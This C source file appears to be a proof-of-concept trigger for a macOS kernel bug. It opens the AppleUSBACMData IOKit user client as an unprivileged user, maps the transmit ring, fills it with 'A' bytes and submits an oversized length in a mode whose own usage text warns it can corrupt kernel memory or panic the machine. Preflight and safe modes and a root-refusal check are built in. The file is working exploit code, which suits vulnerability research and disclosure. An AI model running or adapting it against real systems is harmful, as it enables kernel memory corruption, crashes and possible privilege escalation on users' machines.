#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static io_service_t find_service(void)
{
    io_iterator_t iterator = IO_OBJECT_NULL;
    io_service_t service = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
        IOServiceMatching("AppleUSBACMData"), &iterator);

    if (kr == KERN_SUCCESS) {
        service = IOIteratorNext(iterator);
        IOObjectRelease(iterator);
    }
    return service;
}

int main(int argc, char **argv)
{
    static const char fire_arg[] = "--fire-I-accept-kernel-panic";
    static const char preflight_arg[] = "--preflight";
    static const char safe_arg[] = "--safe-submit";
    io_service_t service;
    io_connect_t connection = IO_OBJECT_NULL;
    mach_vm_address_t transmit_address = 0;
    mach_vm_size_t transmit_size = 0;
    kern_return_t kr;
    int fire;
    int safe;

    if (argc != 2 ||
        (strcmp(argv[1], fire_arg) != 0 &&
         strcmp(argv[1], preflight_arg) != 0 &&
         strcmp(argv[1], safe_arg) != 0)) {
        fprintf(stderr,
            "Usage: %s --preflight | --safe-submit | %s\n"
            "The fire mode can corrupt kernel memory or panic the machine.\n",
            argv[0], fire_arg);
        return 2;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "Refusing to run as root; use an ordinary user.\n");
        return 3;
    }
    fire = strcmp(argv[1], fire_arg) == 0;
    safe = strcmp(argv[1], safe_arg) == 0;

    service = find_service();
    if (service == IO_OBJECT_NULL) {
        fprintf(stderr, "No AppleUSBACMData service found.\n");
        return 4;
    }

    kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "IOServiceOpen(type=0): %#x\n", kr);
        return 5;
    }
    printf("uid=%u opened AppleUSBACMData connection=%#x\n",
        (unsigned)geteuid(), connection);

    const uint64_t setup[] = {20, 16};
    uint32_t output_count = 0;
    kr = IOConnectCallScalarMethod(connection, 0,
        setup, 2, NULL, &output_count);
    printf("selector0 setup: %#x\n", kr);
    if (kr != KERN_SUCCESS) {
        IOServiceClose(connection);
        return 6;
    }

    kr = IOConnectMapMemory64(connection, 2, mach_task_self(),
        &transmit_address, &transmit_size, kIOMapAnywhere);
    printf("map transmit ring: %#x address=%#llx size=%#llx\n",
        kr, transmit_address, transmit_size);
    if (kr != KERN_SUCCESS || transmit_size < 0x8000) {
        IOServiceClose(connection);
        return 7;
    }
    memset((void *)(uintptr_t)transmit_address, 0x41, 0x8000);

    if (!fire && !safe) {
        puts("preflight complete; selector1 was not called");
        IOConnectUnmapMemory64(connection, 2, mach_task_self(), transmit_address);
        IOServiceClose(connection);
        return 0;
    }

    const uint64_t submit[] = {0, fire ? 0x8000 : 0x100};
    output_count = 0;
    printf("calling selector1: ack=0 submit=%#llx\n", submit[1]);
    fflush(stdout);
    kr = IOConnectCallScalarMethod(connection, 1,
        submit, 2, NULL, &output_count);
    printf("selector1 returned: %#x\n", kr);

    IOConnectUnmapMemory64(connection, 2, mach_task_self(), transmit_address);
    IOServiceClose(connection);
    return kr == KERN_SUCCESS ? 0 : 8;
}

